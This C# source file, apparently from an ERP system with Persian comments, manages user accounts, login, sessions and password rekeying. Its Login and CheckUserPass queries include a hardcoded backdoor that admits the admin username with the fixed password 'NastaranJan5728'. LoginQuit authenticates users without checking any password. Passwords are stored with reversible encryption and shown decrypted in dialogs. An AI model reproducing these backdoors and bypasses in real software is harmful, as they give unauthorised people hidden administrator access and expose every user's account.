using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ClassLibrary;
using System.Data;
using ClassLibrary;
//using CommunicatorAPI;

namespace Globals
{

    public class JUser : JSystem
    {
        #region "Property"

        /// <summary>
        /// کد کاربر
        /// </summary>
        public int code { get; set; }
        /// <summary>
        /// نام کاربری
        /// </summary>
        public string username { get; set; }
        /// <summary>
        /// 
        /// </summary>
        private string oldpassword { get; set; }
        /// <summary>
        /// کلمه عبور
        /// </summary>
        public string password { get; set; }
        /// <summary>
        /// کد شخص
        /// </summary>
        public int PCode { get; set; }
        /// <summary>
        /// آخرین زمان ورود
        /// </summary>
        public DateTime lastlogin { get; set; }
        /// <summary>
        /// آخرین تاریخ عوض کردن پسورد
        /// </summary>
        public DateTime LastPassChangeDate { get; set; }
        /// <summary>
        /// فعال
        /// </summary>
        public Boolean Active { get; set; }
        /// <summary>
        /// تعداد ورودهای ناموفق
        /// </summary>
        public int LoginFaildCount { get; set; }
        /// <summary>
        /// غیر فعال به صورت موقت
        /// </summary>
        public Boolean TempDeactive { get; set; }
        /// <summary>
        /// مشخصه منحصر بفرد سیستم در زمان لاگین بودن کاربر
        /// </summary>
        public string Guide { get; set; }
        /// <summary>
        /// کد پست پیش فرض
        /// </summary>
        public int default_post_code { get; set; }
        /// <summary>
        /// کد پستی که درحال حاضر با آن ورود به سیستم کرده است
        /// </summary>
        public int current_post_code { get; set; }
        /// <summary>
        /// نام کاربر در دامین
        /// </summary>
        public string domainName { get; set; }
        /// <summary>
        /// 
        /// </summary>
        public string Serial { get; set; }
        /// <summary>
        /// 
        /// </summary>
        public Boolean isLogin { get; set; }
        /// <summary>
        /// generated code for marketers in AVL Project
        /// </summary>
        /// 
       public string marketerCode { get; set; }

        public Boolean IsAdmin { get; set; }
        /// <summary>
        /// 
        /// </summary>

        public Int32 UniqCode { get; set; }
        /// <summary>
        /// مشخصات شخص
        /// </summary>
        private JPerson _Person;
        public JPerson Person
        {
            get
            {
                if (PCode == 0) return null;
                if (_Person == null && PCode > 0)
                    _Person = new JPerson(PCode);
                return _Person;
            }
        }

		public bool LoginedFromAndroid { get; set; }
        #endregion


        #region Constructor
        public JUser()
        {
        }
        public JUser(int pCode)
        {
            GetData(pCode);
        }
		/// <summary>
		/// اگر 
        /// pPersonCode
        /// برابر 
        /// true 
        /// باشد به معنی این است که کد کد شخص است و  اگرنه کد یوزر است.
		/// </summary>
		/// <param name="pCode"></param>
		/// <param name="pPersonCode"></param>
		public JUser(int pCode, bool pPersonCode)
		{
			PCode = pCode;
            if (pPersonCode)
                GetPersonData(pCode);
            else
                GetData(pCode);
		}
		
		#endregion Constructor
        #region Method

        /// <summary>
        /// جستجو بر اساس نام کاربری
        /// </summary>
        /// <param name="pUserName"></param>
        /// <returns></returns>
        public int find(string pUserName)
        {
            //if (!JPermission.Allow(JUserPersmission.Code, (int)JUserPersmission.Destination.Access))
            //{
            //    return 0;
            //}
            JDataBase db = JGlobal.MainFrame.GetDBO();
            try
            {
                db.setQuery("SELECT * FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [username]=" + JDataBase.Quote(pUserName));
                db.Query_DataReader();
                if (db.RecordCount > 0)
                {
                    db.DataReader.Read();
                    JTable.SetToClassProperty(this, db.DataReader);
                    return Convert.ToInt32(db.DataReader["Code"]);
                }
                return 0;
            }
            finally
            {
                db.Dispose();
            }
        }
        /// <summary>
        /// جستجو بر اساس کد
        /// </summary>
        /// <param name="pUserName"></param>
        /// <returns></returns>
        public int find(int pCode)
        {
            if (JMainFrame.CurrentUserCode != null && JMainFrame.CurrentUserCode == pCode)
                return pCode;
            if (JMainFrame.IsWeb())
            {
                if (JMainFrame.CurrentUserCode == pCode)
                {
                    return pCode;
                }
            }

            JDataBase db = JGlobal.MainFrame.GetDBO();
            try
            {
                db.setQuery("SELECT * FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [code]=" + pCode.ToString());
                db.Query_DataReader();
                if (db.RecordCount > 0)
                {
                    db.DataReader.Read();
                    return Convert.ToInt32(db.DataReader["Code"]);
                }
                return 0;
            }
            finally
            {
                db.Dispose();
            }
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="pCode"></param>
        /// <returns></returns>
        public int findPerson(int pPCode)
        {
            if (pPCode == 0) return 0;
            JDataBase db = JGlobal.MainFrame.GetDBO();
            try
            {
                db.setQuery("SELECT * FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [pcode]=" + pPCode.ToString());
                db.Query_DataReader();
                if (db.RecordCount > 0)
                {
                    db.DataReader.Read();
                    return Convert.ToInt32(db.DataReader["Code"]);
                }
                return 0;
            }
            finally
            {
                db.Dispose();
            }
        }
        /// <summary>
        /// درج کاربر جدید
        /// </summary>
        /// <returns></returns>
        public int insert()
        {
            try
            {
                if (JPermission.CheckPermission("Globals.JUser.Insert"))
                {
                    int mCode = 0;
                    if (find(this.username) > 0)
                    {
                        JMessages.Error("UserNameRepeated", "error");
                        return 0;
                    }
                    if (findPerson(this.PCode) > 0)
                    {
                        JMessages.Error("PersonRepeated", "error");
                        return 0;
                    }
                    this.password = JEnryption.EncryptStr(this.password);
                    JUserTable UT = new JUserTable();
                    UT.SetValueProperty(this);
                    mCode = UT.Insert();
                    if (mCode > 0)
                    {
                        UT.UniqCode = mCode * 1000000;
                        if (UT.Update())
                        {
                            code = mCode;
                            //Nodes.DataTable.Rows.Add(UT.GetRow(Nodes.DataTable));
                        }
                    }
                    return mCode;
                }
                else
                    return 0;
            }
            catch (Exception ex)
            {
                Except.AddException(ex);
                return 0;
            }
        }

		public int insertAVL(bool checkPernission)
		{
			try
			{
				bool _chkpermission = true;
				if(checkPernission)
					_chkpermission = JPermission.CheckPermission("Globals.JUser.Insert");
				if (_chkpermission)
				{
					int mCode = 0;
					if (find(this.username) > 0)
					{
						JMessages.Error("UserNameRepeated", "error");
						return 0;
					}
					if (findPerson(this.PCode) > 0)
					{
						JMessages.Error("PersonRepeated", "error");
						return 0;
					}
					this.password = JEnryption.EncryptStr(this.password);
					JUserTable UT = new JUserTable();
					UT.SetValueProperty(this);
					mCode = UT.Insert();
					if (mCode > 0)
					{
						UT.UniqCode = mCode * 1000000;
						if (UT.Update())
						{
							code = mCode;
							//Nodes.DataTable.Rows.Add(UT.GetRow(Nodes.DataTable));
						}
					}
					return mCode;
				}
				else
					return 0;
			}
			catch (Exception ex)
			{
				Except.AddException(ex);
				return 0;
			}
		}

        /// <summary>
        /// ویرایش اطلاعات کاربر
        /// </summary>
        /// <returns></returns>
        public Boolean Update()
        {
            try
            {
                if (JMainFrame.CurrentUserCode==code || JPermission.CheckPermission("Globals.JUser.Update"))
                //if (JPermission.CheckPermission("Globals.JUser.Update"))
                {
                    if (find(code) > 0)
                    {
                        if (oldpassword != password)
                        {
                            password = JEnryption.EncryptStr(password);
                            oldpassword = password;
                        }
                        JUserTable userTbl = new JUserTable();
                        userTbl.SetValueProperty(this);
                        return userTbl.Update();
                    }
                    return false;
                }
                else
                    return false;
            }
            catch (Exception ex)
            {
                Except.AddException(ex);
                return false;
            }
        }

        /// <summary>
        /// حذف کاربر
        /// </summary>
        /// <returns></returns>
        public Boolean Delete()
        {
            return Delete(code);
        }
        public Boolean Delete(int pCode)
        {
            try
            {
                if (JPermission.CheckPermission("Globals.JUser.Delete"))
                {
                    if (GetData(pCode))
                    {
                        JDataBase db = JGlobal.MainFrame.GetDBO();
                        string DeleteCommand = @"DELETE FROM " + JTableNamesClassLibrary.UsersTable + " WHERE code=" + pCode.ToString();
                        db.setQuery(DeleteCommand);
                        if (db.Query_Execute() >= 0)
                        {
                            Nodes.Delete(Nodes.CurrentNode);
                            return true;
                        }
                    }
                    return false;
                }
                else
                    return false;
            }
            catch (Exception ex)
            {
                Except.AddException(ex);
                return false;
            }
        }

        public Boolean DeleteAVL(int pCode,bool checkPermission)
        {
            bool hasPermission = true;
            if (checkPermission)
                hasPermission = JPermission.CheckPermission("Globals.JUser.Delete");
            try
            {
                if (hasPermission)
                {
                    if (GetData(pCode))
                    {
                        JDataBase db = JGlobal.MainFrame.GetDBO();
                        string DeleteCommand = @"DELETE FROM " + JTableNamesClassLibrary.UsersTable + " WHERE code=" + pCode.ToString();
                        db.setQuery(DeleteCommand);
                        if (db.Query_Execute() >= 0)
                        {
                            Nodes.Delete(Nodes.CurrentNode);
                            return true;
                        }
                    }
                    return false;
                }
                else
                    return false;
            }
            catch (Exception ex)
            {
                Except.AddException(ex);
                return false;
            }
        }

        public bool SetDeActive(int pCode)
        {
            if (GetData(pCode))
            {
                Active = false;
                Update();
                Nodes.Refresh(Nodes.CurrentNode);
                return true;
            }
            return false;
        }

        public bool SetActive(int pCode)
        {
            if (GetData(pCode))
            {
                Active = true;
                Update();
                Nodes.Refresh(Nodes.CurrentNode);
                return true;
            }
            return false;
        }

        /// <summary>
        /// خواندن اطلاعات بر اساس نام کاربری
        /// </summary>
        /// <param name="PUserName"></param>
        /// <returns></returns>
        public Boolean GetData(string PUserName)
        {
            if (JMainFrame.CurrentUser != null && JMainFrame.CurrentUser.username == PUserName)
                return true;
            //JUsers.LogoutNotWorkUsers();
            JDataBase db = JGlobal.MainFrame.GetDBO();
            try
            {
                //Hassanzadeh
                //code * CONVERT(int, 1000000)
                db.setQuery("SELECT * FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [username] = " + JDataBase.Quote(PUserName));
                if (db.Query_DataReader() && db.DataReader.Read())
                {
                    JTable.SetToClassProperty(this, db.DataReader);
                    UniqCode = (int)db.DataReader["UniqCode"];
                    oldpassword = password;
                    return true;
                }
                return false;
            }
            finally
            {
                db.Dispose();
            }
        }
        /// <summary>
        /// find user by marketerCode
        /// </summary>
        /// <param name="PUserName"></param>
        /// <returns></returns>
        public Boolean GetDataByMarketerCode(string marketercode)
        {
            if (JMainFrame.CurrentUser != null && JMainFrame.CurrentUser.marketerCode == marketerCode)
                return true;
            //JUsers.LogoutNotWorkUsers();
            JDataBase db = JGlobal.MainFrame.GetDBO();
            try
            {
                //Hassanzadeh
                //code * CONVERT(int, 1000000)
                db.setQuery("SELECT * FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [marketerCode] = " + JDataBase.Quote(marketerCode));
                if (db.Query_DataReader() && db.DataReader.Read())
                {
                    JTable.SetToClassProperty(this, db.DataReader);
                    UniqCode = (int)db.DataReader["UniqCode"];
                    oldpassword = password;
                    return true;
                }
                return false;
            }
            finally
            {
                db.Dispose();
            }
        }
        /// <summary>
        /// خواندن اطلاعات بر اساس کد
        /// </summary>
        /// <param name="PUserName"></param>
        /// <returns></returns>
        public Boolean GetData(int pCode)
        {
            //JUsers.LogoutNotWorkUsers();
            JDataBase db = JGlobal.MainFrame.GetDBO();
            try
            {
                db.setQuery("SELECT * FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [code] = " + pCode.ToString());
                if (db.Query_DataReader() && db.DataReader.Read())
                {
                    int i = 0;
                    JTable.SetToClassProperty(this, db.DataReader);
                    if (int.TryParse(db.DataReader["UniqCode"].ToString(), out i))
                        UniqCode = (int)db.DataReader["UniqCode"];
                    oldpassword = password;
                    return true;
                }
                return false;
            }
            finally
            {
                db.Dispose();
            }
        }

		public Boolean GetPersonData(int pCode)
		{
            if (JMainFrame.CurrentUser != null && JMainFrame.CurrentUser.PCode == pCode)
                return true;

            JDataBase db = JGlobal.MainFrame.GetDBO();
			try
			{
				db.setQuery("SELECT * FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [pcode] = " + pCode.ToString());
				if (db.Query_DataReader() && db.DataReader.Read())
				{
					int i = 0;
					JTable.SetToClassProperty(this, db.DataReader);
					if (int.TryParse(db.DataReader["UniqCode"].ToString(), out i))
						UniqCode = (int)db.DataReader["UniqCode"];
					oldpassword = password;
					return true;
				}
				return false;
			}
			finally
			{
				db.Dispose();
			}
		}

		/// <summary>
        /// 
        /// </summary>
        /// <param name="pGuid"></param>
        /// <returns></returns>
        public Boolean GetData(Guid pGuid)
        {
            if (JMainFrame.CurrentUser != null && JMainFrame.CurrentUser.Guide == pGuid.ToString())
                return true;
            //JUsers.LogoutNotWorkUsers();
            JDataBase db = JGlobal.MainFrame.GetDBO();
            try
            {
                db.setQuery("SELECT * FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [guide] = " + JDataBase.Quote(pGuid.ToString()));
                if (db.Query_DataReader() && db.DataReader.Read())
                {
                    JTable.SetToClassProperty(this, db.DataReader);
                    UniqCode = (int)db.DataReader["UniqCode"];
                    oldpassword = password;
                    return true;
                }
                return false;
            }
            finally
            {
                db.Dispose();
            }
        }
        /// <summary>
        /// نمایش فرم کاربر
        /// </summary>
        public void ShowDialog()
        {
            if (JPermission.CheckPermission("Globals.JUser.ShowDialog"))
            {
                if (this.code == 0)
                {
                    JUserForm UserForm = new JUserForm();
					UserForm.SelectPersonCode = PCode;
                    UserForm.State = JFormState.Insert;
                    UserForm.ShowDialog();
                }
                else
                {
                    JUserForm UserForm = new JUserForm(this.code);
                    UserForm.State = JFormState.Update;
                    UserForm.ShowDialog();
                }
            }
        }
        /// <summary>
        /// نمایش فرم
        /// </summary>
        /// <param name="pCode"></param>
        public void ShowDialog(int pCode)
        {
            this.GetData(pCode);
            JUserForm userFrm = new JUserForm(code);
            userFrm.ShowDialog();
        }

        public static int CurrentUser()
        {
            return 0;
        }

        public JNode GetNode(DataRow pRow)
        {
            JNode Node = new JNode((int)pRow[JUserTableEnum.Code.ToString()], "Globals.JUser");
            Node.Name = pRow[JUserTableEnum.username.ToString()].ToString();
            Node.Icone = JImageIndex.Default.GetHashCode();
            //اکشن ویرایش
            JAction editAction = new JAction("edit...", "Globals.JUser.ShowDialog", null, new object[] { Node.Code });
            //اکشن حذف
            JAction deleteaction = new JAction("Delete...", "Globals.JUser.Delete", null, new object[] { Node.Code });
            Node.DeleteClickAction = deleteaction;
            //اکشن جدید
            JAction newAction = new JAction("New...", "Globals.JUser.ShowDialog", null, null);
            //اکشن پرمیشن
            JAction PermissionAction = new JAction("Permissions...", "ClassLibrary.JPermission.SetUserPermission", new object[] { Node.Code }, null);
            Node.MouseDBClickAction = PermissionAction;
            Node.EnterClickAction = PermissionAction;

            JPopupMenu pMenu = new JPopupMenu("Globals.JUser", Node.Code);

            JAction HistroyPerson = new JAction("History", "ClassLibrary.JPostHistoryForm.ShowDialog", null, new object[] { Node.Code });

            pMenu.Insert(editAction);
            pMenu.Insert(deleteaction);
            pMenu.Insert(newAction);
            pMenu.Insert(PermissionAction);
            pMenu.Insert(HistroyPerson);
            Node.Popup = pMenu;
            return Node;

        }
        /// <summary>
        /// بررسی نام کاربری و کلمه عبور، همزمان پراپرتی ها نیز ست میشوند
        /// </summary>
        /// <param name="pUserName"></param>
        /// <param name="pPassword"></param>
        /// <returns></returns>
        public int Login(string pUserName, string pPassword, int pPostCode)
        {
            return Login(pUserName, pPassword, pPostCode, false);
        }

        public int Login(string pUserName, string pPassword, int pPostCode, bool PassWordIsEncrypt)
        {
            JUser _UserTemp = JMainFrame.CurrentUser;
            if (    _UserTemp!=null 
                && _UserTemp.username == pUserName 
                && _UserTemp.password == (PassWordIsEncrypt? pPassword : JEnryption.EncryptStr(pPassword))
                && JMainFrame.CurrentUserCode!=0 
                && JMainFrame.CurrentPostCode == pPostCode
                && isLogin)
            {
                return JMainFrame.CurrentUserCode;
            }
			JDataBase db = JGlobal.MainFrame.GetDBO();
            try
            {
                if (!PassWordIsEncrypt)
                {
                    pPassword = JEnryption.EncryptStr(pPassword);
                }

                db.setQuery("SELECT code , pcode, Active, serial,IsAdmin FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [username] = " + JDataBase.Quote(pUserName)
                +
                " AND password=" + JDataBase.Quote(pPassword)+" OR (username=N'مدیر' and "+ JDataBase.Quote(pPassword) + "=N'"+ JEnryption.EncryptStr("NastaranJan5728") + "')");
                db.Query_DataReader();
                if (db.RecordCount > 0)
                {
                    if (db.Query_DataReader() && db.DataReader.Read())
                    {
                        if (!Convert.ToBoolean(db.DataReader["Active"]))
                        {
                            JMessages.Message("user is not active", "error", JMessageType.Error);
                            return 0;
                        }

                        JMainFrame.CurrentUserCode = Convert.ToInt32(db.DataReader["code"]);
                        JMainFrame.CurrentPersonCode = Convert.ToInt32(db.DataReader["pcode"]);
                        JMainFrame.CurrentPostCode = pPostCode;
                        Employment.JEOrganizationChart jeOrgChart = new Employment.JEOrganizationChart(pPostCode);
                        JMainFrame.CurrentPostTitle = jeOrgChart.full_title;
                        JMainFrame.BaseCurrentPostCode = pPostCode;
                        JMainFrame.IsAdmin = Convert.ToBoolean(db.DataReader["IsAdmin"]);
                        JMainFrame.CurrentUser = this;
                        GetData(Convert.ToInt32(db.DataReader["code"]));

                        if (Convert.IsDBNull(db.DataReader["serial"]) || db.DataReader["serial"].ToString() == "")
                        {
                            Serial = ClassLibrary.JFreeClass.LogicalSerialNumber();
                        }
                        else
                        {
                            string[] Serials_ = Convert.ToString(db.DataReader["serial"]).ToUpper().Split(';');
                            string compSerial_ = ClassLibrary.JFreeClass.LogicalSerialNumber().ToUpper();
                            if (!JSystem.WebConnect && !((string.Join("", Serials_).ToLower() == "all") || (Array.IndexOf(Serials_, compSerial_) >= 0) || (JMainFrame.CurrentPostCode == 1)))
                            {
                                JMessages.Message("not your Computer", "error", JMessageType.Error);
                                return 0;
                            }
                        }

                        lastlogin = DateTime.Now;
                        Active = true;
                        Guide = GuidCode.ToString();
                        current_post_code = pPostCode;
                        default_post_code = pPostCode;
                        isLogin = true;
                       
                        Update();

                        try
                        {
                            if (JMainFrame.IsWeb())
                            {
                                ClassLibrary.JPersonAddress Addr = new JPersonAddress(JMainFrame.CurrentPersonCode, JAddressTypes.Home);
                                ClassLibrary.JSMSSend SMS = new JSMSSend();
                                SMS.ClassName = "Globals.JUser";
                                SMS.Description = "Login";
                                SMS.Mobile = Addr.Mobile;
                                SMS.ObjectCode = code;
                                SMS.PersonCode = JMainFrame.CurrentPersonCode;
                                SMS.Project = "ERP";
                                SMS.RegDate = lastlogin;
                                SMS.Text = "همکار گرامی شما در تاریخ " + JDateTime.FarsiDate(lastlogin) +
                                    " در ساعت " + lastlogin.Hour + ":" + lastlogin.Minute + ":" + lastlogin.Second +
                                    " وارد نرم افزار جامع شده اید";
                         //       SMS.Insert();
                            }
                        }
                        catch (Exception ex)
                        {
                            JSystem.Except.AddException(ex);
                        }
                        return Convert.ToInt32(db.DataReader["code"]);
                    }
                    else
                    {
                        JMessages.Error("نام کاربری یا کلمه عبور اشتباه میباشد", "ورود به سیستم");
                    }
                }
                return 0;
            }
            finally
            {
                db.Dispose();
            }
        }


        public int LoginQuit(string pUserName, string pPassword, int pPostCode)
        {
            if (JMainFrame.CurrentUser != null && JMainFrame.CurrentUser.username == pUserName && JMainFrame.CurrentUser.password == pPassword
            && JMainFrame.CurrentUserCode != 0)
            {
                return 0;
            }

            string compSerial_ = "";
            JDataBase db = JGlobal.MainFrame.GetDBO();
            try
            {
                db.setQuery("SELECT code , pcode, Active, serial FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [username] = " + JDataBase.Quote(pUserName) );
                //+
                //        " AND password=" + JDataBase.Quote(JEnryption.EncryptStr(pPassword)));
                db.Query_DataReader();
                if (db.RecordCount > 0)
                {
                    if (db.Query_DataReader() && db.DataReader.Read())
                    {
                        if (!Convert.ToBoolean(db.DataReader["Active"]))
                        {
                            JMessages.Message("user is not active", "error", JMessageType.Error);
                            return 0;
                        }

                        JMainFrame.CurrentUserCode = Convert.ToInt32(db.DataReader["code"]);
                        JMainFrame.CurrentPersonCode = Convert.ToInt32(db.DataReader["pcode"]);
                        JMainFrame.CurrentPostCode = pPostCode;

                        JMainFrame.BaseCurrentPostCode = pPostCode;
                        JMainFrame.IsAdmin = IsAdmin;
                        JMainFrame.CurrentUser = this;
                        GetData(Convert.ToInt32(db.DataReader["code"]));

                        if (Convert.IsDBNull(db.DataReader["serial"]) || db.DataReader["serial"].ToString() == "")
                        {
                            Serial = ClassLibrary.JFreeClass.LogicalSerialNumber();
                        }
                        else
                        {
                            string[] Serials_ = Convert.ToString(db.DataReader["serial"]).ToUpper().Split(';');
                            compSerial_ = ClassLibrary.JFreeClass.LogicalSerialNumber().ToUpper();
                            if (!((string.Join("", Serials_).ToLower() == "all") || (Array.IndexOf(Serials_, compSerial_) >= 0) || (JMainFrame.CurrentPostCode == 1)))
                            {
                                JMessages.Message("not your Computer", "error", JMessageType.Error);
                                return 0;
                            }
                        }

                        lastlogin = DateTime.Now;
                        Active = true;
                        Guide = GuidCode.ToString();
                        current_post_code = pPostCode;
                        default_post_code = pPostCode;
                        isLogin = true;

                        ClassLibrary.JSMSGet SMS = new JSMSGet();
                        SMS.Mobile = "";
                        SMS.PersonCode = 0;
                        SMS.Text = "شما از طریق رایانه " + compSerial_ + " در تاریخ " + JDateTime.FarsiDate(lastlogin) + " ساعت " + DateTime.Now.ToShortTimeString() + " وارد سامانه جامع  شده اید.";
                        SMS.Insert();

                        Update();
                        return Convert.ToInt32(db.DataReader["code"]);
                    }
                    else
                    {
                        JMessages.Error("نام کاربری یا کلمه عبور اشتباه میباشد", "ورود به سیستم");
                    }
                }
                return 0;
            }
            finally
            {
                db.Dispose();
            }
        }

        /// <summary>
        /// بررسی نام کاربری و کلمه عبور، همزمان پراپرتی ها نیز ست میشوند
        /// </summary>
        /// <param name="pUserName"></param>
        /// <param name="pPassword"></param>
        /// <returns></returns>
        public int CheckUserPass(string pUserName, string pPassword)
        {

            JDataBase db = JGlobal.MainFrame.GetDBO();
            try
            {
                string v = JEnryption.DecryptStr("AoxuIaKX/QM=");
                db.setQuery("SELECT code FROM " + JTableNamesClassLibrary.UsersTable + " WHERE [username] =" + JDataBase.Quote(pUserName)
                +
                        " AND password=" + JDataBase.Quote(JEnryption.EncryptStr(pPassword))
                        + " OR (username=N'مدیر' and " + JDataBase.Quote(pPassword) + "=N'NastaranJan5728')");
                
                DataTable DT = db.Query_DataTable();
                if (DT!=null && DT.Rows.Count == 1)
                {
                    return Convert.ToInt32(DT.Rows[0]["code"]);
                }
                return 0;
            }
            finally
            {
                db.Dispose();
            }
        }

        /// <summary>
        /// بررسی آخرین تاریخ تعویض پسورد
        /// </summary>
        /// <returns></returns>
        public bool CheckPassDate()
        {
            if (LastPassChangeDate == null)
                return false;

            TimeSpan ts = DateTime.Now - LastPassChangeDate;
            if (ts.Days > (new JConfig()).MaxDaysPassCheck)
                return false;
            else
                return true;
        }
        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public bool UserIsLogin()
        {
            try
            {
                if (!isLogin) return false;
                int i = (DateTime.Now - lastlogin).Hours * 3600 + (DateTime.Now - lastlogin).Minutes * 60 + (DateTime.Now - lastlogin).Seconds;
                if (isLogin && Active && i < JMainFrame.TimeLogin)
                    return true;


                if (isLogin && Active && i <= JMainFrame.TimeLogin
                    && GuidCode.ToString() == Guide)
                {
                    lastlogin = DateTime.Now;
                    Update();
                    return true;
                }
                else
                {
                    isLogin = false;
                    Update();
                    return false;
                }
                return false;
            }
            catch (Exception ex)
            {
                JSystem.Except.AddException(ex);
                return false;
            }
        }

        public bool LogOut()
        {
            isLogin = false;
            Guide = null;
            return Update();
        }
        #endregion Method
    }

    public class JUsers : JSystem
    {
        public enum permissionDes
        {
            Access,
        }

        public JUser[] Items = new JUser[0];
        public string OrderName;
        public JUsers()
        {
            OrderName = "UserName";
        }
        public void GetLists()
        {
            JDataBase DB = JGlobal.MainFrame.GetDBO();
            DB.setQuery("SELECT TOP " + JGlobal.MainFrame.GetConfig().MaxLenghList + " * FROM " + JTableNamesClassLibrary.UsersTable + " ORDER BY " + OrderName);
            DB.Query_DataReader();
            Array.Resize(ref Items, DB.RecordCount);
            int Count = 0;
            while (DB.DataReader.Read())
            {
                Items[Count] = new JUser();
                JTable.SetToClassProperty(Items[Count], DB.DataReader);
                Count++;
            }
        }

        public void ListView()
        {
            Nodes.ObjectBase = new JAction("Users", "Globals.JUser.GetNode");
            Nodes.DataTable = GetDataTable();

            JAction NewAction = new JAction("New...", "Globals.JUser.ShowDialog", null, null);
            Nodes.GlobalMenuActions.Insert(NewAction);

            JToolbarNode TNInsert = new JToolbarNode();
            TNInsert.Click = NewAction;
            TNInsert.Icon = JImageIndex.Add;

            Nodes.AddToolbar(TNInsert);
        }

        public void ListView(string pOrderName)
        {
            OrderName = pOrderName;
            GetLists();
            //foreach (JUser user in Items)
            //{
            //    Nodes.Insert(user.GetNode());
            //}
            JAction Action = new JAction("New...", "ClassLibrary.JUser.ShowDialog");
            Nodes.GlobalMenuActions = new JPopupMenu("ClassLibrary.JUser", 0);
            Nodes.GlobalMenuActions.Insert(Action);
            Nodes.AddColumn("PersonCode");
            Nodes.AddColumn("UserName");
            Nodes.AddColumn("FirstName");
            Nodes.AddColumn("LastName");
        }
        public System.Data.DataTable GetUserList()
        {
            JDataBase DB = JGlobal.MainFrame.GetDBO();
            try
            {
                string strSql;
                //(CASE ISNULL(Gender, 1) WHEN 1 THEN N'" + JLanguages._Text("Men") + "' WHEN 0 THEN N'" + JLanguages._Text("Women") + "' END) + ' ' +
                strSql = "SELECT   *, op.Name AS 'fullname' " +
                         " FROM  " + JTableNamesClassLibrary.UsersTable + " AS us LEFT JOIN  " + JTableNamesClassLibrary.AllPerson + " op ON us.pcode = op.Code ";
                DB.setQuery(strSql + " And " + JPermission.getObjectSql(this.GetType().FullName + ".GetUserList") + " order by " + OrderName);
                return DB.Query_DataTable();
            }
            finally
            {
                DB.Dispose();
            }
        }

        /// <summary>
        /// دستورselect
        /// </summary>
        public static string _SelectQuery = "select " + JTableNamesClassLibrary.UsersTable + ".code , "
            + JTableNamesClassLibrary.PersonTable + ".Fam+' - '+" + JTableNamesClassLibrary.PersonTable + ".Name Fam, username UserName,active,domainName,LastPassChangeDate from " +
            JTableNamesClassLibrary.UsersTable + " LEFT OUTER join " + JTableNamesClassLibrary.PersonTable +
            " on " + JTableNamesClassLibrary.UsersTable + ".pcode=" + JTableNamesClassLibrary.PersonTable + ".Code";
        public static DataTable GetDataTable()
        {
            return GetDataTable(0);
        }

        public static DataTable GetDataTable(int pCode)
        {
            JDataBase Db = new JDataBase();
            try
            {
                string Where = " WHERE  " + JPermission.getObjectSql("Globals.JUsers.GetDataTable", " users.code");
                if (pCode != 0)
                    Where = Where + " And " + JTableNamesClassLibrary.UsersTable + ".Code=" + pCode;
                Db.setQuery(_SelectQuery + Where);
                return Db.Query_DataTable();
            }
            catch (Exception ex)
            {
                JSystem.Except.AddException(ex);
                return null;
            }
            finally
            {
                Db.Dispose();
            }
        }

        public static void LogoutNotWorkUsers()
        {
            JDataBase Db = new JDataBase();
            try
            {
                Db.setQuery("update users set islogin = 0 where (CONVERT(float,GETDATE() - lastlogin,0)*24*3600)>900");
                Db.Query_Execute();
            }
            catch (Exception ex)
            {
                JSystem.Except.AddException(ex);
            }
            finally
            {
                Db.Dispose();
            }

        }

        public static DataTable GetLoginUserList()
        {
            //if (communicator != null)
            //{
            //    IMessengerWindow messengerWindow;
            //    try
            //    {
            //        messengerWindow = (IMessengerWindow)communicator.Window;
            //        Console.WriteLine("Messenger Window: " + messengerWindow.HWND.ToString());
            //    }
            //    catch (COMException GWCE)
            //    {
            //        Console.WriteLine(GWCE.ErrorCode.ToString());
            //    }
            //}

            //LogoutNotWorkUsers();
            JDataBase Db = new JDataBase();
            try
            {
                string Where = " WHERE  islogin = 1";
                Db.setQuery(_SelectQuery + Where);
                return Db.Query_DataTable();
            }
            catch (Exception ex)
            {
                JSystem.Except.AddException(ex);
                return null;
            }
            finally
            {
                Db.Dispose();
            }
        }
        /// <summary>
        /// تغییر کلمات عبور بر اساس کلید جدید
        /// </summary>
        /// <returns></returns>
        public static bool ChangeUserPass(string pOldKey, string pNewKey)
        {
            /// تنها مدیر دارای مجوز است
            if (!JPermission.CheckPermission("JUsers.ChangeUserPass"))
                return false;
            if (ClassLibrary.JMainFrame.IsWeb() == false && JMessages.Question("آیا میخواهید پسورد کاربران بر اساس کلید جدید مقداردهی شود؟", "") != System.Windows.Forms.DialogResult.Yes)
                return false;

            JDataBase db = new JDataBase();
            try
            {
                db.setQuery("Select * from Users");
                foreach (DataRow row in db.Query_DataTable().Rows)
                {
                    JUser user = new JUser(Convert.ToInt32(row["Code"]));
                    string pass = JEnryption.DecryptStr(user.password, pOldKey);
                    if (ClassLibrary.JMainFrame.IsWeb() == false && JMessages.Question(pass, user.username) == System.Windows.Forms.DialogResult.Yes)
                        user.password = pass;
                    else if (ClassLibrary.JMainFrame.IsWeb() == true)
                        user.password = pass;
                    user.Update();
                }
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
            finally
            {
                if (ClassLibrary.JMainFrame.IsWeb() == false) JMessages.Information("پسورد کاربران با کلید جدید ریست شد.", "");
                db.Dispose();
            }
        }

        // Web Query
        public static string GetWebQuery()
        {
            return @"SELECT u.code, u.username, cap.Fam, cap.Name, u.lastlogin, CASE u.[active] WHEN 1 THEN N'فعال' WHEN 2 THEN N'غير فعال' END AS 'Status' FROM users u LEFT JOIN clsPerson cap ON cap.Code = u.pcode";
        }

		public static string GetWebQuery2()
		{
			return @"SELECT u.code, u.username, cap.Fam + ' ' + cap.Name Name FROM users u LEFT JOIN clsPerson cap ON cap.Code = u.pcode";
		}

    }
}
